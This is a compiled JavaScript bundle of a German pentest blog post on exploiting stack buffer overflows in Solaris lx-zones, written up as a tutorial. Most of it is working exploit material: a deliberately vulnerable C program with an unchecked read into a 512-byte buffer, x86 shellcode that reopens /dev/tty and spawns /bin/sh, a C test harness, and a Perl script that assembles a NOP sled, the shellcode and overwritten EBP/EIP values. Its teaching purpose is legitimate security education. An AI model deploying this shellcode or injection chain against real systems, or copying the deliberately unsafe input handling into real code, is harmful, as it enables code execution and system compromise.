"use strict";(self.webpackChunkjanstarke_blog=self.webpackChunkjanstarke_blog||[]).push([[4323],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>m});var r=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var o=r.createContext({}),d=function(e){var n=r.useContext(o),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},c=function(e){var n=d(e.components);return r.createElement(o.Provider,{value:n},e.children)},u="mdxType",p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},h=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,a=e.originalType,o=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=d(t),h=i,m=u["".concat(o,".").concat(h)]||u[h]||p[h]||a;return t?r.createElement(m,s(s({ref:n},c),{},{components:t})):r.createElement(m,s({ref:n},c))}));function m(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var a=t.length,s=new Array(a);s[0]=h;var l={};for(var o in n)hasOwnProperty.call(n,o)&&(l[o]=n[o]);l.originalType=e,l[u]="string"==typeof e?e:i,s[1]=l;for(var d=2;d<a;d++)s[d]=t[d];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}h.displayName="MDXCreateElement"},5107:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>s,default:()=>p,frontMatter:()=>a,metadata:()=>l,toc:()=>d});var r=t(7462),i=(t(7294),t(3905));const a={title:"Solaris: Bufferoverflows in lx-Zones ausnutzen",date:"2014-01-27",categories:["exploits","pentest"],layout:"post",authors:["jasa"]},s=void 0,l={permalink:"/blog/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen",source:"@site/blog/2014-01-27-solaris-bufferoverflows-in-lx-zones-ausnutzen.md",title:"Solaris: Bufferoverflows in lx-Zones ausnutzen",description:"In diesem Artikel wird gezeigt, dass es m\xf6glich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuf\xfchren, wenn dieser einen bestimmten Aufbau hat.",date:"2014-01-27T00:00:00.000Z",formattedDate:"January 27, 2014",tags:[],readingTime:6.63,hasTruncateMarker:!1,authors:[{name:"Jan Starke",title:"Senior Forensic Analyst",url:"https://github.com/janstarke",imageURL:"https://github.com/janstarke.png",key:"jasa"}],frontMatter:{title:"Solaris: Bufferoverflows in lx-Zones ausnutzen",date:"2014-01-27",categories:["exploits","pentest"],layout:"post",authors:["jasa"]},prevItem:{title:"Userspace tool for (anti-forensically safe) wiping unallocated disk space",permalink:"/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space"}},o={authorsImageUrls:[void 0]},d=[],c={toc:d},u="wrapper";function p(e){let{components:n,...t}=e;return(0,i.kt)(u,(0,r.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"In diesem Artikel wird gezeigt, dass es m\xf6glich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuf\xfchren, wenn dieser einen bestimmten Aufbau hat."),(0,i.kt)("p",null,"Zun\xe4chst wird beispielhaft ein Programm gezeigt, dass eine Bufferoverflow-Schwachstelle hat. Anschlie\xdfend wird ein Shellcode entwickelt, der die Besonderheiten der User-Level-Calls in einer lx-Zone unter Solaris ber\xfccksichtigt. Das wird erreicht, indem der lx_brandz.so.1 ein virtueller Stack untergeschoben wird, damit der Shellcode w\xe4hrend des Aufrufs von exec() nicht ver\xe4ndert wird. Abschlie\xdfend werden ein Programm und ein Script entwickelt, die zusammen einen kompletten Injection-Vector erzeugen."),(0,i.kt)("h1",{id:"das-opfer"},"Das Opfer..."),(0,i.kt)("p",null,"Um das Beispiel einfach zu halten, wird ein einfacher Stack-basierter \xdcberlauf genutzt. Das angegriffene Programm wird nachfolgend gezeigt:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},"#include <stdio.h>\n#include <sys/mman.h>\n#include <errno.h>\n\n#define UNPROTECT_STACK\n#define STACK_BEGIN 0x08046000\n#define STACK_SIZE 8192\n#define STACK_PERMISSIONS PROT_READ | PROT_WRITE | PROT_EXEC\n")),(0,i.kt)("p",null,"Die Funktion ",(0,i.kt)("inlineCode",{parentName:"p"},"__get_esp()")," wird \xfcber das Makro ",(0,i.kt)("inlineCode",{parentName:"p"},"TRACE_ESP")," genutzt, um die Adresse des Stack auszugeben. Normalerweise steht in einem anzugreifenden Programm dieses Feature nicht zur Verf\xfcgung, daher kann es auch hier abgeschaltet werden. In einem solchen Fall kann der Wert des ",(0,i.kt)("inlineCode",{parentName:"p"},"%esp"),"-","Registers einfach \xfcber die Nutzung eines Debuggers ermittelt werden."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},'unsigned long __get_esp() {\n  __asm__("movl %esp,%eax");\n}\n#ifdef PRINT_ESP\n#define TRACE_ESP(functionname) \\\n\xa0(printf("%s at %%esp: 0x%08x\\n", (functionname), __get_esp()))\n#else\n#define TRACE_ESP(functionname)\n#endif\n')),(0,i.kt)("p",null,"Aus Demonstrationszwecken wurde die Funktion ",(0,i.kt)("inlineCode",{parentName:"p"},"__gets()")," programmiert, die sich jedoch in etwa wie ",(0,i.kt)("inlineCode",{parentName:"p"},"gets()")," verh\xe4lt. Der qualitative Unterschied ist, dass das Verhalten der Funktion beim Lesen von Bin\xe4rdaten besser beeinflusst werden kann."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},"/* dangerous: __gets is evil!!! never call this function!!! */\nvoid __gets(char* ptr) {\n char c;\n while (fread(&c, sizeof(c), 1, stdin)) {\n  if (c == '\\n')\n   break;\n  else\n   *ptr++ = c;\n }\n *ptr = '\\0';\n}\n")),(0,i.kt)("p",null,"Der Angriff selbst richtet sich gegen die Funktion ",(0,i.kt)("inlineCode",{parentName:"p"},"do_work()"),". Es wird ausgenutzt, dass ",(0,i.kt)("inlineCode",{parentName:"p"},"__gets()")," in den Buffer name schreibt, ohne zu pr\xfcfen, ob gen\xfcgend Platz im Buffer ist."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},'void do_work() {\n char name[512];\n TRACE_ESP("do_work");\n printf("What\'s your name? ");\n __gets(name);\n printf("hello, %s\\n", name);\n}\n')),(0,i.kt)("p",null,"Interessant ist im Hauptprogramm vor dem Aufruf von ",(0,i.kt)("inlineCode",{parentName:"p"},"do_work()")," die Manipulation der Zugriffsrechte des Stacks. Hier ist es f\xfcr den Interessierten m\xf6glich, zu testen, wie sich das Programm bei eingeschr\xe4nkten Zugriffsrechten (insbesondere ohne ",(0,i.kt)("inlineCode",{parentName:"p"},"PROT_EXEC"),") verh\xe4lt."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},'int main(void) {\n#ifdef UNPROTECT_STACK\n if (0 != mprotect((void*)STACK_BEGIN,\n       STACK_SIZE, STACK_PERMISSIONS)) {\n  fprintf(stderr, "mprotect: %s\\n", strerror(errno));\n  return -1;\n }\n#endif\n TRACE_ESP("main");\n do_work();\n return 1;\n}\n')),(0,i.kt)("h1",{id:"der-t\xe4ter"},"Der T\xe4ter"),(0,i.kt)("p",null,"Der Shellcode arbeitet in mehreren Schritten:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Sprung zum Ende des Shellcodes (",(0,i.kt)("inlineCode",{parentName:"li"},"call_position"),") und wieder zur\xfcck an den Anfang. Damit liegt die Adresse des ersten Bytes nach dem call auf dem Stack. Diese wird dann in ",(0,i.kt)("inlineCode",{parentName:"li"},"%esi")," gespeichert."),(0,i.kt)("li",{parentName:"ul"},"Anlegen eines neuen Stackframes unterhalb des Shellcodes. Das Problem ist, dass in der Testumgebung (Solaris Brandz mit Linux) ein Aufruf von ",(0,i.kt)("inlineCode",{parentName:"li"},"int $0x80")," in eine Anwendungsbibliothek (",(0,i.kt)("inlineCode",{parentName:"li"},"lx_brandz.so.1"),") weitergeleitet wird. Diese Funktionsaufrufe belegen nat\xfcrlich Platz auf unserem Stack und \xfcberschreiben die Zeichenkette ",(0,i.kt)("inlineCode",{parentName:"li"},'"/bin/sh"')," und die beiden Pointer ",(0,i.kt)("inlineCode",{parentName:"li"},"argv")," und ",(0,i.kt)("inlineCode",{parentName:"li"},"env"),". Durch das Erzeugen des neuen Stackframes werden die Daten vor dem \xdcberschreiben gesch\xfctzt."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"stdin")," schlie\xdfen und wieder neu starten. Bei der Vorf\xfchrung wird das Programm den Injection Vector (IV) per Pipe oder Eingabeumleitung lesen. Nach dem vollst\xe4ndigen Lesen des IV und anschlie\xdfenden Starten von ",(0,i.kt)("inlineCode",{parentName:"li"},"/bin/sh")," wird ",(0,i.kt)("inlineCode",{parentName:"li"},"read()")," keine Daten mehr zu lesen haben, was die Shell als ",(0,i.kt)("inlineCode",{parentName:"li"},"EOF")," interpretiert und sich beendet. Daher schlie\xdfen wir die Pipe und \xf6ffnen ",(0,i.kt)("inlineCode",{parentName:"li"},"/dev/tty")," als Dateideskriptor 0, was ",(0,i.kt)("inlineCode",{parentName:"li"},"stdin")," entspricht."),(0,i.kt)("li",{parentName:"ul"},"Ausf\xfchren von ",(0,i.kt)("inlineCode",{parentName:"li"},"/bin/sh"),". Eine ausf\xfchrliche Erkl\xe4rung dieses Programmfragments findet sich in ",(0,i.kt)("a",{parentName:"li",href:"http://www.phrack.com/issues.html?issue=49&id=14",title:"Smashing The Stack For Fun And Profit"},"Aleph One: Smashing The Stack For Fun And Profit. Phrack, Volume Seven, Issue Forty-Nine"),".")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},'char shellcode[] = \n  "\\xeb\\x43"      /*   jmp    0x804840d <call_position> */\n  "\\x5e"          /*   pop    %esi */\n /* create artificial stack begin */\n  "\\x89\\xf4"      /*   mov    %esi, %esp */\n  "\\x89\\xf5"      /*   mov  %esi, %ebp */\n  "\\x83\\xed\\x40"  /*   sub  $0x40, %ebp */\n  "\\x83\\xec\\x60"  /*   sub  $0x60, %esp */\n /* close stdin and reopen it */\n  "\\x56"          /*   push   %esi */\n  "\\x31\\xc0"      /*   xor    %eax,%eax */\n  "\\xb0\\x06"      /*   mov    $0x6,%al */\n  "\\x31\\xdb"      /*   xor    %ebx,%ebx */\n  "\\xcd\\x80"      /*   int    $0x80 */\n  "\\x5e"          /*   pop    %esi */\n  "\\x56"          /*   push   %esi */\n  "\\x31\\xc0"      /*   xor    %eax,%eax */\n  "\\x88\\x46\\x0f"  /*   mov    %al,0x0f(%esi) */\n  "\\xb0\\x05"      /*   mov    $0x5,%al */\n  "\\x8d\\x5e\\x07"  /*   lea    0x7(%esi),%ebx */\n  "\\x31\\xc9"      /*   xor    %ecx,%ecx */\n  "\\xcd\\x80"      /*   int    $0x80 */\n  "\\x5e"          /*   pop    %esi */\n /* exec /bin/sh (I copied the whole thing from shellcode.org) */\n  "\\x89\\x76\\x08"  /*   mov    %esi,0x8(%esi) */\n  "\\x31\\xc0"      /*   xor    %eax,%eax */\n  "\\x88\\x46\\x07"  /*   mov    %al,0x7(%esi) */\n  "\\x89\\x46\\x0c"  /*   mov    %eax,0xc(%esi) */\n  "\\xb0\\x0b"      /*   mov    $0xb,%al */\n  "\\x89\\xf3"      /*   mov    %esi,%ebx */\n  "\\x8d\\x4e\\x08"  /*   lea    0x8(%esi),%ecx */\n  "\\x8d\\x56\\x0c"  /*   lea    0xc(%esi),%edx */\n  "\\xcd\\x80"      /*   int    $0x80 */\n  "\\x31\\xdb"      /*   xor    %ebx,%ebx */\n  "\\x89\\xd8"      /*   mov    %ebx,%eax */\n  "\\x40"          /*   inc    %eax */\n  "\\xcd\\x80"      /*   int    $0x80 */\n  "\\xe8\\xb8\\xff\\xff\\xff"  /*   call   start_of_exploit */\n  "/bin/sh"\n  "/dev/tty";\n')),(0,i.kt)("h1",{id:"shellcodec"},(0,i.kt)("inlineCode",{parentName:"h1"},"shellcode.c")),(0,i.kt)("p",null,"Wir nutzen nachfolgendes Programm, um den Shellcode auszugeben bzw. den Injection Vector zu konstruieren. Das Programm versteht die Parameter ",(0,i.kt)("inlineCode",{parentName:"p"},"-l")," (Ausgeben der L\xe4nge des Shellcode) und ",(0,i.kt)("inlineCode",{parentName:"p"},"-x")," (Ausf\xfchren des Shellcodes). Wenn man das Programm ohne Parameter ausf\xfchrt, wird der Shellcode auf ",(0,i.kt)("inlineCode",{parentName:"p"},"stdout")," ausgegeben."),(0,i.kt)("p",null,"Der Shellcode selbst sollte in einer Variable namens ",(0,i.kt)("inlineCode",{parentName:"p"},"shellcode")," gespeichert sein, die wiederum in einer Headerdatei definiert ist. Diese Headerdatei wird -- ungew\xf6hnlicherweise -- mitten innerhalb von main() eingebunden. Die Ursache daf\xfcr ist, dass der Shellcode davon ausgeht, sich innerhalb des Stacks zu befinden. Um den Shellcode zu testen, sollte man also eine m\xf6glichst realistische Umgebung schaffen und den Shellcode in einem lokalen Puffer speichern."),(0,i.kt)("p",null,"Auch hier m\xf6chte ich wieder auf die M\xf6glichkeit hinweisen, die Verhaltensweise des Shellcodes bei einem mit ",(0,i.kt)("inlineCode",{parentName:"p"},"mprotect()")," gesch\xfctzten Stack auszuprobieren."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},'#include <stdio.h>\n#include <string.h>\n#include <sys/mman.h>\n \nint\nmain(int argc, char* argv[]) {\n/* include shellcode buffer here, so that it is stored on the stack */\n#include "own.c"\n if (argc == 1) {\n  printf("%s", shellcode);\n  return 0;\n }\n if (argc == 2 && 0 == strcmp(argv[1], "-l")) {\n  printf("%d\\n", strlen(shellcode));\n  return 0;\n }\n if (argc == 2 && 0 == strcmp(argv[1], "-x")) {\n  /* allow to execute code on the stack */\n  mprotect((void*)0x08046000, 8192, PROT_READ | PROT_WRITE | PROT_EXEC);\n  void (*code)() = (void(*)())shellcode;\n  code();\n  return -1;\n }\n fprintf(stderr, "Usage: %s [-l|-x]\\n", argv[0]);\n return 1;\n}\n')),(0,i.kt)("h1",{id:"shellcodepl"},(0,i.kt)("inlineCode",{parentName:"h1"},"shellcode.pl")),(0,i.kt)("p",null,"Dieses Perl-Script ist ein Wrapper f\xfcr das aus ",(0,i.kt)("inlineCode",{parentName:"p"},"shellcode.c")," entstehende Programm, der den kompletten Injection Vector (IV) konstruiert. Der IV besteht aus folgenden Teilen:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"viele NOPs. Dieser Bereich wird zum NOP-Sliding genutzt, da wir uns hier nicht damit besch\xe4ftigen wollen, wie wir den Shellcode direkt bytegenau ansprechen k\xf6nnen."),(0,i.kt)("li",{parentName:"ul"},"Shellcode"),(0,i.kt)("li",{parentName:"ul"},"nochmal NOPs. Manchmal k\xf6nnte es sinnvoll sein, den Shellcode etwas in den Bereich niedriger Adressen zu verschieben. Als Platzhalter bis zum Instruction Pointer dienen diese NOP-Befehle. EBP. Eine 4 Byte gro\xdfe Zahl, die die Basisadresse des n\xe4chsth\xf6heren Stackframes ist. Da unser Shellcode einen neuen Stackframe anlegt, kann diese Zahl beliebig sein. EIP. Eine 4 Byte gro\xdfe Zahl, die die Adresse des ersten auszuf\xfchrenden Befehls des IV ist. Den korrekten Wert dieser Adresse zu ermitteln bedeutet, sich einige Zeit mit einem Debugger zu besch\xe4ftigen. Ich m\xf6chte hier ebenfalls auf die Lekt\xfcre der sehr ausf\xfchrlichen Texte des Phrack-Magazins verweisen. Das Script bekommt als Parameter die L\xe4nge des zu \xfcberschreibenden Puffers und die Anzahl der nach dem Shellcode einzuf\xfcgenden NOPs \xfcbergeben. Wie man diese Zahlen ermittelt, wird an dieser Stelle ebenfalls nicht besprochen.","  Die Gesamtgr\xf6\xdfe des auf ",(0,i.kt)("inlineCode",{parentName:"li"},"stdout")," ausgegebenen IV ist 8 Byte gr\xf6\xdfer als die angegebene Pufferl\xe4nge (f\xfcr EBP und EIP).",(0,i.kt)("pre",{parentName:"li"},(0,i.kt)("code",{parentName:"pre",className:"language-perl"},'#!/usr/bin/perl -w\nuse strict;\n \nif (2 != scalar @ARGV) {\n die "./shellcode.pl  \\n";\n}\n \nmy $buffer_length = $ARGV[0];\nmy $nop_length2 = $ARGV[1];\n \nbinmode STDOUT;\n \nchomp (my $shellcode_length = \\`./shellcode -l\\`);\nmy $shellcode = \\`./shellcode\\`;\nmy $nop_length1 = $buffer_length - $shellcode_length;\nmy $eip_recurrence=1;\n \nprint STDERR "shellcode length: $shellcode_length bytes\\n";\nprint STDERR "buffer length:    $buffer_length bytes\\n";\nprint STDERR "nop sliding 1:    $nop_length1 bytes\\n";\nprint STDERR "nop sliding 2:    $nop_length2 bytes\\n";\n \nmy $eip = chr(0x20) . chr(0x75) . chr(0x04) . chr(0x08);\nmy $ebp = $eip;\n\nmy $nop_slide1 = (chr(0x90)x$nop_length1);\nmy $nop_slide2 = (chr(0x90)x$nop_length2);\nmy $iv = $nop_slide1 . $shellcode . $nop_slide2 . $ebp . ($eip x $eip_recurrence);\n \nprint STDOUT $iv;\n')))))}p.isMDXComponent=!0}}]);